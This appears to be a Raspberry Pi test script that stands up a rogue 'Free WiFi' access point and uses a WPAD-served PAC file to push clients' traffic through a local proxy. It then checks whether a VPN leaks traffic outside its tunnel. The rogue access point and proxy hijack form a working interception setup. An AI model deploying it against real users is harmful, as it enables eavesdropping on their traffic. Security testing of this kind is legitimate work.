(*
 * WPAD attack with local proxy on the Raspberry Pi.
 * The PAC file is hosted on the external server (via /?wpad).
 * A forward proxy runs locally on the Pi; the PAC file directs clients to it.
 *
 * Configuration:
 *   - server_secret             : shared secret (must match API_SECRET on server)
 *   - proxy.server              : URL of the server (e.g. "https://yourserver.com/")
 *   - proxy.local_addr          : address:port of the local proxy as seen by clients
 *   - proxy.direct              : hosts that should NOT go through the proxy (separated by ;)
 *   - ap.dhcp4_wpad_url         : URL of the PAC file on the server
 *   - mon.validation_server     : URL of the validation server
 *   - mon.vpn_endpoints         : VPN endpoints to confirm that VPN is active
 *)

state init begin:
  miscnet = miscnet();
  miscnet.masquerade("true");

  server_secret = "change_this_to_a_long_random_secret";

  proxy = remote_proxy();
  proxy.server = "https://yourserver.com/";
  proxy.mode = "local";
  proxy.local_addr = "192.168.60.1:8080";
  proxy.direct = "192.168.60.1";
  proxy.bring_up(proxy_ready, proxy_err);

state proxy_err:
  exit("Failed to start proxy: ", errstr);

state proxy_ready:
  ap = accesspoint();
  ap.wifi_interface = "wlan0";
  ap.wifi_ssid = "Free WiFi";
  ap.ipv4_addr = "192.168.60.1";
  ap.ipv4_netmask = "255.255.255.0";
  ap.dhcp4_enable = "true";
  ap.dhcp4_dns = "192.168.60.1";
  ap.dhcp4_router = "192.168.60.1";
  ap.dhcp4_wpad_url = "https://yourserver.com/?wpad";
  ap.dns_enable = "true";
  ap.bring_up(ap_up, ap_err);

state ap_err:
  exit("Failed to bring up access point: ", errstr);

state ap_up:
  mon = trafficmonitor();
  mon.interface = ap.ap_interface;
  mon.validation_server = "https://yourserver.com/";
  mon.vpn_endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);

state mon_err:
  exit("Traffic monitoring error: ", errstr);

state vpn_safe:
  exit("VPN appears safe: traffic went through the VPN tunnel.");

state vpn_vuln:
  exit("VPN is vulnerable: traffic leaked outside the tunnel!");
